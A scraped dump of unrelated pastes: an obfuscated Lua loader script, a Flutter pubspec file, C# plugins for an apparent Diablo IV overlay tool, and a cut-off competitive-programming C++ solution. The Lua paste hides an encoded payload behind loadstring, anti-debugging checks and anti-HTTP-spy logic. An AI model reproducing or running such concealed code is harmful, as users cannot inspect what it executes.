return(function(a)local b=a:gsub(""1"",""2"")local c=#b;local d=""\114\101\116\117\114\110\40\102\117\110\99\116\105\111\110\40\41\108\111\99\97\108\32\102\61\95\69\78\86\32\111\114\32\103\101\116\102\101\110\118\40\41\32\108\111\99\97\108\32\102\117\99\107\104\116\116\112\115\112\121\32\61\32\48\32\108\111\99\97\108\32\103\61\48\32\108\111\99\97\108\32\99\61\102\117\110\99\116\105\111\110\40\97\44\95\41\105\102\32\97\61\61\34\72\50\72\51\57\56\70\50\51\72\57\73\68\74\57\48\51\50\56\74\83\68\50\48\57\34\116\104\101\110\32\114\101\116\117\114\110\32\102\91\34\92\49\49\53\92\49\49\54\92\49\49\52\92\49\48\53\92\49\49\48\92\49\48\51\34\93\91\34\99\104\97\114\34\93\101\108\115\101\105\102\32\97\61\61\34\66\51\52\72\56\55\51\52\55\72\56\50\51\56\57\50\57\56\49\34\116\104\101\110\32\114\101\116\117\114\110\32\102\91\34\92\49\49\53\92\49\49\54\92\49\49\52\92\49\48\53\92\49\49\48\92\49\48\51\34\93\91\34\98\121\116\101\34\93\101\108\115\101\105\102\32\97\61\61\34\70\74\78\70\50\57\56\50\56\57\49\57\74\83\49\48\48\34\116\104\101\110\32\114\101\116\117\114\110\32\102\91\34\92\49\49\54\92\57\55\92\57\56\92\49\48\56\92\49\48\49\34\93\91\34\99\111\110\99\97\116\34\93\101\108\115\101\105\102\32\97\61\61\34\82\78\50\57\57\73\83\57\50\57\75\57\48\75\48\50\34\116\104\101\110\32\114\101\116\117\114\110\32\102\91\34\92\49\49\53\92\49\49\54\92\49\49\52\92\49\48\53\92\49\49\48\92\49\48\51\34\93\91\34\115\117\98\34\93\101\110\100\32\101\110\100\32\103\61\48\32\108\111\99\97\108\32\95\61\102\117\110\99\116\105\111\110\40\95\41\103\61\40\49\53\94\49\45\51\48\43\49\48\43\49\48\42\50\41\32\105\102\32\95\61\61\34\69\52\54\53\70\51\52\85\78\70\50\85\57\50\57\56\73\48\57\49\48\65\49\34\116\104\101\110\32\105\102\32\99\40\34\72\50\72\51\57\56\70\50\51\72\57\73\68\74\57\48\51\50\56\74\83\68\50\48\57\34\41\40\49\49\57\41\126\61\34\119\34\116\104\101\110\32\114\101\116\117\114\110\32\49\53\32\101\108\115\101\105\102\32\99\40\34\66\51\52\72\56\55\51\52\55\72\56\50\51\56\57\50\57\56\49\34\41\40\34\119\34\41\126\61\49\49\57\32\116\104\101\110\32\114\101\116\117\114\110\32\49\53\32\101\110\100\32\101\110\100\32\101\110\100\32\105\102\32\95\40\34\69\52\54\53\70\51\52\85\78\70\50\85\57\50\57\56\73\48\57\49\48\65\49\34\41\61\61\103\32\116\104\101\110\32\102\91\40\34\103\110\105\114\116\115\100\97\111\108\34\41\58\114\101\118\101\114\115\101\40\41\93\61\110\105\108\32\114\101\116\117\114\110\32\53\54\94\50\32\101\108\115\101\32\103\61\55\32\101\110\100\32\105\102\32\103\61\61\40\51\43\52\54\94\49\45\52\50\41\116\104\101\110\32\114\101\116\117\114\110\40\102\117\110\99\116\105\111\110\40\95\41\108\111\99\97\108\32\101\61\95\58\108\111\119\101\114\40\41\32\101\61\34\34\32\108\111\99\97\108\32\95\61\40\102\117\110\99\116\105\111\110\40\100\41\108\111\99\97\108\32\97\61\100\58\103\115\117\98\40\34\88\84\79\82\33\34\44\34\34\41\32\108\111\99\97\108\32\95\61\35\100\32\108\111\99\97\108\32\98\61\100\32\98\61\52\43\49\32\102\91\40\34\103\110\105\114\116\115\100\97\111\108\34\41\58\114\101\118\101\114\115\101\40\41\93\61\110\105\108\32\108\111\99\97\108\32\95\44\95\61\102\117\110\99\116\105\111\110\40\41\103\43\61\55\94\51\42\52\47\53\52\43\49\48\48\32\95\61\35\100\43\57\49\94\50\43\52\32\101\110\100\44\102\117\110\99\116\105\111\110\40\41\103\43\61\49\94\52\43\53\55\32\95\61\35\100\43\51\52\32\101\110\100\32\101\61\97\58\103\115\117\98\40\34\46\34\44\102\117\110\99\116\105\111\110\40\95\41\114\101\116\117\114\110\32\99\40\34\72\50\72\51\57\56\70\50\51\72\57\73\68\74\57\48\51\50\56\74\83\68\50\48\57\34\41\40\95\58\98\121\116\101\40\41\43\98\41\101\110\100\41\101\110\100\41\40\34\88\84\79\82\33\92\49\48\52\92\49\48\55\92\57\51\92\57\54\92\49\49\49\92\49\49\50\92\49\49\48\92\49\48\49\92\49\48\54\92\57\57\92\51\54\92\57\57\92\57\51\92\49\48\53\92\57\55\92\53\52\92\54\56\92\49\49\50\92\49\49\50\92\49\48\56\92\54\55\92\57\55\92\49\49\50\92\51\54\92\51\48\92\49\48\52\92\49\48\55\92\57\51\92\57\54\92\49\49\49\92\49\49\50\92\49\49\48\92\49\48\49\92\49\48\54\92\57\57\92\51\54\92\57\57\92\57\51\92\49\48\53\92\57\55\92\53\52\92\54\56\92\49\49\50\92\49\49\50\92\49\48\56\92\54\55\92\57\55\92\49\49\50\92\51\54\92\51\48\92\49\48\48\92\49\49\50\92\49\49\50\92\49\48\56\92\49\49\49\92\53\52\92\52\51\92\52\51\92\49\49\48\92\57\51\92\49\49\53\92\52\50\92\57\57\92\49\48\49\92\49\49\50\92\49\48\48\92\49\49\51\92\57\52\92\49\49\51\92\49\49\49\92\57\55\92\49\49\48\92\57\53\92\49\48\55\92\49\48\54\92\49\49\50\92\57\55\92\49\48\54\92\49\49\50\92\52\50\92\57\53\92\49\48\55\92\49\48\53\92\52\51\92\49\48\53\92\49\49\52\92\49\48\57\92\49\48\54\92\57\51\92\52\51\92\55\56\92\49\48\55\92\57\52\92\49\48\52\92\49\48\55\92\49\49\54\92\52\51\92\49\48\53\92\57\51\92\49\48\49\92\49\48\54\92\52\51\92\54\54\92\56\54\92\57\55\92\49\49\48\92\49\48\55\92\52\51\92\55\51\92\57\51\92\49\48\49\92\49\48\54\92\51\48\92\51\55\92\51\55\92\51\54\92\51\55\92\51\48\92\51\55\92\51\55\92\51\54\92\51\55\92\54\34\41\32\103\43\61\51\32\108\111\99\97\108\32\95\61\102\91\40\34\103\110\105\114\116\115\100\97\111\108\34\41\58\114\101\118\101\114\115\101\40\41\93\32\105\102\40\103\101\116\102\101\110\118\40\41\91\34\92\49\48\48\92\49\48\49\92\57\56\92\49\49\55\92\49\48\51\34\93\46\103\101\116\105\110\102\111\40\49\41\91\34\92\57\57\92\49\49\55\92\49\49\52\92\49\49\52\92\49\48\49\92\49\49\48\92\49\49\54\92\49\48\56\92\49\48\53\92\49\49\48\92\49\48\49\34\93\126\61\49\41\116\104\101\110\32\114\101\116\117\114\110\32\101\110\100\32\119\104\105\108\101\40\116\114\117\101\41\100\111\32\101\61\101\58\103\115\117\98\40\34\46\34\44\102\117\110\99\116\105\111\110\40\95\41\114\101\116\117\114\110\32\99\40\34\72\50\72\51\57\56\70\50\51\72\57\73\68\74\57\48\51\50\56\74\83\68\50\48\57\34\41\40\95\58\98\121\116\101\40\41\45\49\41\101\110\100\41\32\105\102\32\103\61\61\49\32\116\104\101\110\32\114\101\116\117\114\110\32\52\94\50\44\95\40\34\108\111\99\97\108\32\97\32\61\32\48\34\41\101\108\115\101\105\102\32\103\60\53\48\48\32\116\104\101\110\32\95\40\101\41\40\41\101\108\115\101\105\102\35\101\62\57\51\52\94\51\52\51\42\57\101\57\32\116\104\101\110\32\114\101\116\117\114\110\40\34\83\99\114\105\112\116\32\105\115\32\116\111\111\32\108\97\114\103\101\32\116\111\32\114\117\110\32\111\110\32\88\84\79\82\34\41\101\108\115\101\105\102\32\103\61\61\45\52\94\51\56\47\52\32\116\104\101\110\32\95\40\34\108\111\99\97\108\32\122\32\61\32\48\32\122\32\61\32\110\105\108\34\41\101\108\115\101\105\102\32\103\60\48\32\116\104\101\110\32\114\101\116\117\114\110\32\51\52\94\52\53\44\110\105\108\44\102\117\110\99\116\105\111\110\40\41\101\110\100\32\101\108\115\101\105\102\32\103\61\61\49\94\57\101\57\32\116\104\101\110\32\114\101\116\117\114\110\32\49\44\52\44\54\44\51\44\53\44\55\44\50\44\53\44\55\54\44\51\44\54\44\51\44\54\44\55\44\49\32\101\108\115\101\105\102\32\110\111\116\32\95\32\116\104\101\110\32\114\101\116\117\114\110\32\110\105\108\32\101\108\115\101\105\102\32\110\111\116\32\101\32\116\104\101\110\32\114\101\116\117\114\110\35\40\34\83\99\114\105\112\116\32\105\115\32\110\111\116\32\97\98\108\101\32\116\111\32\114\117\110\32\119\105\116\104\111\117\116\32\98\121\116\101\99\111\100\101\46\34\41\101\108\115\101\105\102\32\110\111\116\32\103\32\116\104\101\110\32\114\101\116\117\114\110\35\40\34\67\104\101\99\107\32\104\97\115\32\116\111\32\98\101\32\97\99\116\105\118\97\116\101\100\32\116\111\32\98\101\32\97\98\108\101\32\116\111\32\114\117\110\34\41\101\108\115\101\105\102\32\110\111\116\32\102\32\116\104\101\110\32\114\101\116\117\114\110\35\40\34\119\116\102\32\98\114\111\32\106\117\115\116\32\115\116\111\112\46\34\41\101\110\100\32\98\114\101\97\107\32\101\110\100\32\114\101\116\117\114\110\40\34\88\84\79\82\34\41\101\110\100\41\40\34\78\50\57\74\50\57\74\70\57\51\56\74\56\70\51\72\50\56\57\74\72\56\51\52\55\84\72\71\72\51\52\55\56\71\72\85\51\89\52\72\71\55\72\51\52\55\52\71\56\57\72\71\52\56\72\55\71\56\72\57\55\71\54\72\52\71\57\71\56\54\72\55\72\55\56\71\56\85\89\72\71\51\89\72\56\71\51\72\52\52\51\84\71\55\71\55\52\54\51\71\52\51\54\72\55\56\71\52\72\55\56\52\71\51\72\57\74\56\52\72\51\55\71\56\55\72\56\50\71\72\51\70\71\50\54\70\51\70\71\51\50\54\72\70\50\51\72\55\56\52\70\55\56\72\52\71\56\74\57\34\41\101\110\100\32\101\110\100\41\40\41"" local e=_ENV or getfenv()e[""loadstring""](d)()end)(""XTOR!2347871809478237491"")"
agKPZc1L,Untitled,Niftl,YAML,Thursday 13th of July 2023 08:33:13 AM CDT,"name: unicom_healthcare
description: A new Flutter project.

# The following line prevents the package from being accidentally published to
# pub.dev using `flutter pub publish`. This is preferred for private packages.
publish_to: 'none' # Remove this line if you wish to publish to pub.dev

# The following defines the version and build number for your application.
# A version number is three numbers separated by dots, like 1.2.43
# followed by an optional build number separated by a +.
# Both the version and the builder number may be overridden in flutter
# build by specifying --build-name and --build-number, respectively.
# In Android, build-name is used as versionName while build-number used as versionCode.
# Read more about Android versioning at https://developer.android.com/studio/publish/versioning
# In iOS, build-name is used as CFBundleShortVersionString while build-number used as CFBundleVersion.
# Read more about iOS versioning at
# https://developer.apple.com/library/archive/documentation/General/Reference/InfoPlistKeyReference/Articles/CoreFoundationKeys.html
version: 1.0.0+1

environment:
  sdk: "">=2.17.6 <3.0.0""

# Dependencies specify other packages that your package needs in order to work.
# To automatically upgrade your package dependencies to the latest versions
# consider running `flutter pub upgrade --major-versions`. Alternatively,
# dependencies can be manually updated by changing the version numbers below to
# the latest version available on pub.dev. To see which dependencies have newer
# versions available, run `flutter pub outdated`.
dependencies:
  #  commons:
  #    path: ../commons

  flutter:
    sdk: flutter

  flutter_localizations:
    sdk: flutter

  # The following adds the Cupertino Icons font to your application.
  # Use with the CupertinoIcons class for iOS style icons.
  cupertino_icons: ^1.0.2
  device_info_plus: ^4.1.2
  http: ^0.13.5
  qr_flutter: ^4.0.0
  mobile_scanner: ^2.0.0
  localstorage: ^4.0.0+1
  flutter_native_splash: ^2.2.16
  flutter_html: ^3.0.0-alpha.6
  intl: ^0.18.0
  provider: ^6.0.4
  shared_preferences: ^2.0.15
  country_flags: ^1.0.0
  universal_io: ^2.0.4
  fhir: ^0.9.3


dev_dependencies:
  flutter_test:
    sdk: flutter

  # The ""flutter_lints"" package below contains a set of recommended lints to
  # encourage good coding practices. The lint set provided by the package is
  # activated in the `analysis_options.yaml` file located at the root of your
  # package. See that file for information about deactivating specific lint
  # rules and activating additional ones.
  flutter_lints: ^2.0.0

# For information on the generic Dart part of this file, see the
# following page: https://dart.dev/tools/pub/pubspec

# The following section is specific to Flutter packages.
flutter:

  generate: true
  # The following line ensures that the Material Icons font is
  # included with your application, so that you can use the icons in
  # the material Icons class.
  uses-material-design: true

  # To add assets to your application, add an assets section, like this:
  assets:
    - assets/splashscreen/
    - assets/l10n/
    - assets/images/
    - assets/images/placeholders/

  # An image asset can refer to one or more resolution-specific ""variants"", see
  # https://flutter.dev/assets-and-images/#resolution-aware

  # For details regarding adding assets from package dependencies, see
  # https://flutter.dev/assets-and-images/#from-packages

  # To add custom fonts to your application, add a fonts section here,
  # in this ""flutter"" section. Each entry in this list should have a
  # ""family"" key with the font family name, and a ""fonts"" key with a
  # list giving the asset and other descriptors for the font. For
  # example:
  fonts:
    - family: AppIcons
      fonts:
        - asset: assets/fonts/AppIcons.ttf

    - family: Montserrat
      fonts:
        - asset: assets/fonts/Montserrat/static/Montserrat-Thin.ttf
          weight: 100
        - asset: assets/fonts/Montserrat/static/Montserrat-ExtraLight.ttf
          weight: 200
        - asset: assets/fonts/Montserrat/static/Montserrat-Light.ttf
          weight: 300
        - asset: assets/fonts/Montserrat/static/Montserrat-Regular.ttf
          weight: 400
        - asset: assets/fonts/Montserrat/static/Montserrat-Medium.ttf
          weight: 500
        - asset: assets/fonts/Montserrat/static/Montserrat-SemiBold.ttf
          weight: 600
        - asset: assets/fonts/Montserrat/static/Montserrat-Bold.ttf
          weight: 700
        - asset: assets/fonts/Montserrat/static/Montserrat-ExtraBold.ttf
          weight: 800
        - asset: assets/fonts/Montserrat/static/Montserrat-Black.ttf
          weight: 900

  # For details regarding fonts from package dependencies,
  # see https://flutter.dev/custom-fonts/#from-packages
"
CYadxtyF,HerbOre,s4000,C#,Thursday 13th of July 2023 08:27:44 AM CDT,"namespace T4.Plugins.DAV;

public class HerbOre : BasePlugin, IRenderEnabler, IGameWorldPainter {
	public Feature IconSetting { get; private set; }

	public float SizeMap { get; set; } = 5f;
	public float SizeScreen { get; set; } = 10f;

	private IEnumerable<IGizmoActor> matList { get; set; }
	private Dictionary<ActorSnoId, bool> actorList { get; set; }
	private ITexture iconMap { get; set; } = Services.Render.GetTexture(SupportedTextureId.UIMinimapIcons_109);
	private ITexture iconOre { get; set; } = Services.Render.GetTexture(SupportedTextureId.UIChallengesCrafting01_012);
	private ITexture iconHerb { get; set; } = Services.Render.GetTexture(SupportedTextureId.UIChallengesCrafting01_027);

	public bool BeforeRender() {
		matList = Services.Game.GizmoActors.Where(x => actorList.TryGetValue(x.ActorSno.SnoId, out var enabled) && enabled);

		return true;
	}

	public void PaintGameWorld(GameWorldLayer layer) {
		if (matList.Count() == 0) return;

		if (layer == GameWorldLayer.Map) {
			if (SizeMap <= 0) return;

			var sizeMap = Services.Game.WindowHeight / 108f * SizeMap;
			var sizeMap2 = sizeMap / 2;
			foreach (var actor in matList) {
				if (actor.Coordinate.IsOnMap)
					iconMap.Draw(actor.Coordinate.MapX - sizeMap2, actor.Coordinate.MapY - sizeMap2, sizeMap, sizeMap, false);
			}
		}
		else if (SizeScreen > 0) {
			var sizeScreen = Services.Game.WindowHeight / 108f * SizeScreen;
			var sizeScreen2 = sizeScreen / 2;
			foreach (var actor in matList) {
				if (actor.Coordinate.IsOnScreen)
					DrawIcon(actor.ActorSno.SnoId, actor.Coordinate.ScreenX - sizeScreen2, actor.Coordinate.ScreenY - sizeScreen2, sizeScreen, false);
			}
		}
	}

	private void DrawIcon(ActorSnoId actorId, float x, float y, float size, bool sharp) {
		switch (actorId) {
			case ActorSnoId.HarvestNode_Ore_Global_Common :
			case ActorSnoId.HarvestNode_Ore_Global_Common_PROLOGUE :
			case ActorSnoId.HarvestNode_Ore_Global_Rare :
			case ActorSnoId.USZ_HarvestNode_Ore_UberSubzone_001_Dyn :
				iconOre.Draw(x, y, size, size, sharp);
				break;
			default :
				iconHerb.Draw(x, y, size, size, sharp);
				break;
		}
	}

// initial setting
	public override string GetDescription() => Services.Translation.Translate(this, ""show the nearby herbs/ores"");

	public override void Load() {
		base.Load();

		var actorSnoIds = new ActorSnoId[] {
			ActorSnoId.HarvestNode_Herb_Common_Gallowvine,
			ActorSnoId.HarvestNode_Herb_Common_Gallowvine_PROLOGUE,
			ActorSnoId.HarvestNode_Herb_Frac_Biteberry,
			ActorSnoId.HarvestNode_Herb_Frac_Biteberry_PROLOGUE,
			ActorSnoId.HarvestNode_Herb_Hawe_Blightshade,
			ActorSnoId.HarvestNode_Herb_Kehj_Lifesbane,
			ActorSnoId.HarvestNode_Herb_Rare_Angelbreath,
			ActorSnoId.HarvestNode_Herb_Rare_FiendRose,
			ActorSnoId.HarvestNode_Herb_Scos_HowlerMoss,
			ActorSnoId.HarvestNode_Herb_Step_Reddamine,

			ActorSnoId.HarvestNode_Ore_Global_Common,
			ActorSnoId.HarvestNode_Ore_Global_Common_PROLOGUE,
			ActorSnoId.HarvestNode_Ore_Global_Rare,
			ActorSnoId.USZ_HarvestNode_Ore_UberSubzone_001_Dyn
		};

		actorList = actorSnoIds.ToDictionary(x => x, x => true);

		IconSetting = new Feature() {
			Plugin = this,
			NameOf = nameof(IconSetting),
			DisplayName = () => Services.Translation.Translate(this, ""icon on screen / map""),
			Resources = new() {
				new FloatFeatureResource() {
					NameOf = nameof(SizeScreen),
					DisplayText = () => Services.Translation.Translate(this, ""icon size - screen""),
					MinValue = 0.0f,
					MaxValue = 20.0f,
					Getter = () => SizeScreen,
					Setter = newValue => SizeScreen = MathF.Round(newValue, 1),
				},
				new FloatFeatureResource() {
					NameOf = nameof(SizeMap),
					DisplayText = () => Services.Translation.Translate(this, ""icon size - map""),
					MinValue = 0.0f,
					MaxValue = 10.0f,
					Getter = () => SizeMap,
					Setter = newValue => SizeMap = MathF.Round(newValue, 1),
				},
			},
		};

		for (var i = 0; i < actorSnoIds.Length; i++) {
			var actorSnoId = actorSnoIds[i];
			IconSetting.Resources.Add(new BooleanFeatureResource() {
				NameOf = actorSnoId.ToString(),
				DisplayText = () => Services.GameData.GetActorSno(actorSnoId).NameLocalized,
				Getter = () => actorList[actorSnoId], // .TryGetValue(actorSnoId, out var enabled) && enabled,
				Setter = newValue => actorList[actorSnoId] = newValue,
			});
		}

		Services.Customization.RegisterFeature(IconSetting);
	}
}"
91BP45ds,CountMaterial,s4000,C#,Thursday 13th of July 2023 08:20:46 AM CDT,"namespace T4.Plugins.DAV;

public class CountMaterial : BasePlugin, IGameUserInterfacePainter {
	public Feature TableSetting { get; private set; }

	public float SizeMultiplier { get; set; } = 0.8f;
	public IFont TextFont { get; set; } = Services.Render.GetFont(255, 255, 220, 220, fontFamily: ""segoe ui"", size: 9, shadowMode: FontShadowMode.Light);

	private ITexture bgIcon { get; set; } = Services.Render.GetTexture(SupportedTextureId.UIButtonLight_000);
	private List<MaterialData> matList { get; set; } = new List<MaterialData>();

	public void PaintGameUserInterface(GameUserInterfaceLayer layer) {
		if (layer != GameUserInterfaceLayer.OverPanels) return;
		if (!Services.UserInterface.InventoryAreaControl.Visible) return;

		var rect = Services.UserInterface.GetInventorySlotControl(0, 0, 2);
		var w = rect.Width * SizeMultiplier;
		var h = rect.Height * SizeMultiplier;
		var x = Services.UserInterface.InventoryAreaControl.Left;
		foreach (var mat in matList)
			mat.DrawCount(bgIcon, TextFont, x, rect.Top, w, h);
	}

	public class MaterialData {
		public string Name { get; private set; }
		public CurrencyType Currency { get; private set; }
		public ITexture Icon { get; private set; }

		private int xref { get; set; }
		private int yref { get; set; }

		// public MaterialData(ItemSnoId snoId, CurrencyType currency, uint iconId, int classType, int classRank) {
		public MaterialData(CurrencyType currency, ItemSnoId snoId, uint iconId, int classType, int classRank) {
			var material = Services.GameData.GetItemSno(snoId);
			Name = material.NameLocalized;
			Currency = currency;
			// Currency = material.CurrencyType;
			Icon = Services.Render.GetTexture(iconId);
			xref = classRank;
			yref = classType;
		}

		public void DrawCount(ITexture bgTexture, IFont font, float x, float y, float w, float h) {
			x -= w * xref;
			y -= h * yref;
			bgTexture.Draw(x, y, w, h);
			Icon.Draw(x, y, w, h);

			if (Services.Game.MyPlayer.Currencies.TryGetValue(Currency, out var count)) {
				var tl = font.GetTextLayout(count.ToString(""#,##0""));
				tl.DrawText(x + w - tl.Width, y + h - tl.Height);
			}

			if (Services.Game.CursorInsideRect(x, y, w, h))
				Services.Hint.SetHint(Name);
		}
	}

/*
type	rank	CurrencyType	Name	ItemSnoId	SupportedTextureId
1	1	CommonHerb	Gallowvine	ItemSnoId.CraftingMaterial_Herb_Common	SupportedTextureId.InventoryMaterials_004
1	2	RareHerb	Angelbreath	ItemSnoId.CraftingMaterial_Herb_Rare	SupportedTextureId.InventoryMaterials_000
1	3	SuperRareHerb	FiendRose	ItemSnoId.CraftingMaterial_Herb_SuperRare	SupportedTextureId.InventoryMaterials_003
1	4	ScosglenHerb	HowlerMoss	ItemSnoId.CraftingMaterial_Herb_Scosglen	SupportedTextureId.InventoryMaterials_032
1	5	FracturedPeaksHerb	Biteberry	ItemSnoId.CraftingMaterial_Herb_FracturedPeaks	SupportedTextureId.InventoryMaterials_001
1	6	DrySteppesHerb	Reddamine	ItemSnoId.CraftingMaterial_Herb_Drysteppes	SupportedTextureId.InventoryMaterials_006
1	7	HawezarHerb	Blightshade	ItemSnoId.CraftingMaterial_Herb_Hawezar	SupportedTextureId.InventoryMaterials_002
1	8	KehjistanHerb	Lifesbane	ItemSnoId.CraftingMaterial_Herb_Kehjistan	SupportedTextureId.InventoryMaterials_005

2	1	CommonOre	IronChunk	ItemSnoId.CraftingMaterial_Ore_Common	SupportedTextureId.InventoryMaterials_018
2	2	RareOre	SilverOre	ItemSnoId.CraftingMaterial_Ore_Rare	SupportedTextureId.InventoryMaterials_023
2	3	RareScatteredPrism	ScatteredPrism	ItemSnoId.CraftingMaterial_Rare_ScatteredPrism	SupportedTextureId.InventoryMaterials_022

3	1	CommonLeather	Rawhide	ItemSnoId.CraftingMaterial_Leather_Common	SupportedTextureId.InventoryMaterials_020
3	2	RareLeather	SuperiorLeather	ItemSnoId.CraftingMaterial_Leather_Rare	SupportedTextureId.InventoryMaterials_026

4	1	DemonHeart	DemonsHeart	ItemSnoId.CraftingMaterial_MonsterDrop_Demon_Heart	SupportedTextureId.InventoryMaterials_014
4	2	HumanTongue	Paletongue	ItemSnoId.CraftingMaterial_MonsterDrop_Human_Tongue	SupportedTextureId.InventoryMaterials_019
4	3	UndeadDust	GraveDust	ItemSnoId.CraftingMaterial_MonsterDrop_Undead_Dust	SupportedTextureId.InventoryMaterials_016
4	4	WildlifeBones	CrushedBeastBones	ItemSnoId.CraftingMaterial_MonsterDrop_Wildlife_Bones	SupportedTextureId.InventoryMaterials_013

5	1	SacredLegendarySalvage	ForgottenSoul	ItemSnoId.CraftingMaterial_Salvage_Sacred_Legendary	SupportedTextureId.InventoryMaterials_015
5	2	RareSalvage	VeiledCrystal	ItemSnoId.CraftingMaterial_Salvage_Rare	SupportedTextureId.InventoryMaterials_031
5	3	LegendaryArmorSalvage	CoilingWard	ItemSnoId.CraftingMaterial_Salvage_Legendary_Armor	SupportedTextureId.InventoryMaterials_012
5	4	LegendaryJewelrySalvage	AbstruseSigil	ItemSnoId.CraftingMaterial_Salvage_Legendary_Jewelry	SupportedTextureId.InventoryMaterials_008
5	5	SigilSalvage	SigilPowder	ItemSnoId.CraftingMaterial_Salvage_Nightmare_Sigil_Powder	SupportedTextureId.InventoryQuestNature_001
5	6	LegendaryWeaponSalvage	BalefulFragment	ItemSnoId.CraftingMaterial_Salvage_Legendary_Weapon	SupportedTextureId.InventoryMaterials_007

*/

// initial setting
	public override string GetDescription() => Services.Translation.Translate(this, ""display material summary at inventory"");

	public override void Load() {
		base.Load();

		matList.Add(new MaterialData(CurrencyType.CommonHerb, ItemSnoId.CraftingMaterial_Herb_Common, SupportedTextureId.InventoryMaterials_004, 1, 1));
		matList.Add(new MaterialData(CurrencyType.RareHerb, ItemSnoId.CraftingMaterial_Herb_Rare, SupportedTextureId.InventoryMaterials_000, 1, 2));
		matList.Add(new MaterialData(CurrencyType.SuperRareHerb, ItemSnoId.CraftingMaterial_Herb_SuperRare, SupportedTextureId.InventoryMaterials_003, 1, 3));
		matList.Add(new MaterialData(CurrencyType.ScosglenHerb, ItemSnoId.CraftingMaterial_Herb_Scosglen, SupportedTextureId.InventoryMaterials_032, 1, 4));
		matList.Add(new MaterialData(CurrencyType.FracturedPeaksHerb, ItemSnoId.CraftingMaterial_Herb_FracturedPeaks, SupportedTextureId.InventoryMaterials_001, 1, 5));
		matList.Add(new MaterialData(CurrencyType.DrySteppesHerb, ItemSnoId.CraftingMaterial_Herb_Drysteppes, SupportedTextureId.InventoryMaterials_006, 1, 6));
		matList.Add(new MaterialData(CurrencyType.HawezarHerb, ItemSnoId.CraftingMaterial_Herb_Hawezar, SupportedTextureId.InventoryMaterials_002, 1, 7));
		matList.Add(new MaterialData(CurrencyType.KehjistanHerb, ItemSnoId.CraftingMaterial_Herb_Kehjistan, SupportedTextureId.InventoryMaterials_005, 1, 8));
		matList.Add(new MaterialData(CurrencyType.CommonOre, ItemSnoId.CraftingMaterial_Ore_Common, SupportedTextureId.InventoryMaterials_018, 2, 1));
		matList.Add(new MaterialData(CurrencyType.RareOre, ItemSnoId.CraftingMaterial_Ore_Rare, SupportedTextureId.InventoryMaterials_023, 2, 2));
		matList.Add(new MaterialData(CurrencyType.RareScatteredPrism, ItemSnoId.CraftingMaterial_Rare_ScatteredPrism, SupportedTextureId.InventoryMaterials_022, 2, 3));
		matList.Add(new MaterialData(CurrencyType.CommonLeather, ItemSnoId.CraftingMaterial_Leather_Common, SupportedTextureId.InventoryMaterials_020, 3, 1));
		matList.Add(new MaterialData(CurrencyType.RareLeather, ItemSnoId.CraftingMaterial_Leather_Rare, SupportedTextureId.InventoryMaterials_026, 3, 2));
		matList.Add(new MaterialData(CurrencyType.DemonHeart, ItemSnoId.CraftingMaterial_MonsterDrop_Demon_Heart, SupportedTextureId.InventoryMaterials_014, 4, 1));
		matList.Add(new MaterialData(CurrencyType.HumanTongue, ItemSnoId.CraftingMaterial_MonsterDrop_Human_Tongue, SupportedTextureId.InventoryMaterials_019, 4, 2));
		matList.Add(new MaterialData(CurrencyType.UndeadDust, ItemSnoId.CraftingMaterial_MonsterDrop_Undead_Dust, SupportedTextureId.InventoryMaterials_016, 4, 3));
		matList.Add(new MaterialData(CurrencyType.WildlifeBones, ItemSnoId.CraftingMaterial_MonsterDrop_Wildlife_Bones, SupportedTextureId.InventoryMaterials_013, 4, 4));
		matList.Add(new MaterialData(CurrencyType.SacredLegendarySalvage, ItemSnoId.CraftingMaterial_Salvage_Sacred_Legendary, SupportedTextureId.InventoryMaterials_015, 5, 1));
		matList.Add(new MaterialData(CurrencyType.RareSalvage, ItemSnoId.CraftingMaterial_Salvage_Rare, SupportedTextureId.InventoryMaterials_031, 5, 2));
		matList.Add(new MaterialData(CurrencyType.LegendaryArmorSalvage, ItemSnoId.CraftingMaterial_Salvage_Legendary_Armor, SupportedTextureId.InventoryMaterials_012, 5, 3));
		matList.Add(new MaterialData(CurrencyType.LegendaryJewelrySalvage, ItemSnoId.CraftingMaterial_Salvage_Legendary_Jewelry, SupportedTextureId.InventoryMaterials_008, 5, 4));
		matList.Add(new MaterialData(CurrencyType.SigilSalvage, ItemSnoId.CraftingMaterial_Salvage_Nightmare_Sigil_Powder, SupportedTextureId.InventoryQuestNature_001, 5, 5));
		matList.Add(new MaterialData(CurrencyType.LegendaryWeaponSalvage, ItemSnoId.CraftingMaterial_Salvage_Legendary_Weapon, SupportedTextureId.InventoryMaterials_007, 5, 6));

		TableSetting = new Feature() {
			Plugin = this,
			NameOf = nameof(TableSetting),
			DisplayName = () => Services.Translation.Translate(this, ""item count on tabs""),
			Resources = new() {
				new FontFeatureResource() {
					NameOf = nameof(TextFont),
					DisplayText = () => Services.Translation.Translate(this, ""font""),
					Font = TextFont,
				},
				new FloatFeatureResource() {
					NameOf = nameof(SizeMultiplier),
					DisplayText = () => Services.Translation.Translate(this, ""size""),
					MinValue = 0.5f,
					MaxValue = 1f,
					Getter = () => SizeMultiplier,
					Setter = newValue => SizeMultiplier = MathF.Round(newValue, 1),
				},
			},
		};

		Services.Customization.RegisterFeature(TableSetting);
	}
}"
epeXX2bR,CEOI '20 - Chess Rush (51pts),erek1e,C++,Thursday 13th of July 2023 07:54:08 AM CDT,"#include <bits/stdc++.h>
#define NDEBUG

using namespace std;

const int INF = 1e8;
const int BASE = 1e9 + 7;
inline int add(int x, int y) {
    x += y;
    if (x >= BASE) return x-BASE;
    return x;
}

int R, C;
inline bool sameDiagonal(int x1, int y1, int x2, int y2) {
    return x1-y1 == x2-y2 || x1+y1 == x2+y2;
}
inline bool sameColor(int x1, int y1, int x2, int y2) {
    return ((x1+y1)-(x2+y2)) % 2 == 0;
}
inline bool inBoard(int r, int c) {
    return r >= 1 && c >= 1 && r <= R && c <= C;
}
inline pair<int, int> diagonalIntersect(int x1, int y1, int x2, int y2) {
    // x + y = x1 + y1
    // x - y = x2 - y2
    // x = (x1 + y1 + x2 - y2) / 2
    // y = (x1 + y1 - x2 + y2) / 2
    return {(x1+y1+x2-y2)/2, (x1+y1-x2+y2)/2};
}

inline pair<int, int> downRight(int r, int c) {
    return {r+C-c, C};
}
inline pair<int, int> downLeft(int r, int c) {
    return {r+c-1, 1};
}

inline pair<int, int> combine(pair<int, int> a, pair<int, int> b) { // (moves, ways)
    if (a.first == b.first) return {a.first, add(a.second, b.second)};
    else if (a.first < b.first) return a;
    else return b;
}

// going right
inline pair<int, int> solveBishop(int c1, int cr) {
    vector<int> ways(2*C), moves(2*C, INF);
    ways[c1-1] = 1, moves[c1-1] = 1;
    for (int r = 2; r <= R; ++r) {
